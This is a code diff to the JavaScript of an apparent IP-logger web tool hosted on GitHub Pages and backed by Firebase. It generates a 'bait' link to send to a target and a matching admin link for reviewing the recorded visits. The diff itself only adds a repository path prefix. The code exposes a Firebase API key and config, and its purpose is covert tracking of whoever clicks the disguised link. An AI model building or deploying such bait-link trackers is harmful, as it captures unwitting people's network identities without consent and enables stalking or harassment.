@@ -17,7 +17,7 @@
     import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
     import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore.js";
 
-    // ✅ Your Firebase config
+    // 🔑 Firebase config
     const firebaseConfig = {
       apiKey: "AIzaSyDB_KZ3PvzhxS2rW_MNoUle0quTS254plo",
       authDomain: "ip-logger-hopefully-theone.firebaseapp.com",
@@ -31,6 +31,8 @@
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
 
+    const repoName = "/meow"; // ✅ important for GitHub Pages
+
     function randomString(length) {
       const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
       return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
@@ -42,8 +44,8 @@
 
       await setDoc(doc(db, "links", sessionId), { code: code, visits: [] });
 
-      const baitLink = window.location.origin + "/user.html?id=" + sessionId;
-      const adminLink = window.location.origin + "/admin.html?id=" + sessionId + "&code=" + code;
+      const baitLink = window.location.origin + repoName + "/user.html?id=" + sessionId;
+      const adminLink = window.location.origin + repoName + "/admin.html?id=" + sessionId + "&code=" + code;
 
       document.getElementById("bait").innerHTML = `<a href="${baitLink}" target="_blank">${baitLink}</a>`;
       document.getElementById("admin").innerHTML = `<a href="${adminLink}" target="_blank">${adminLink}</a>`;
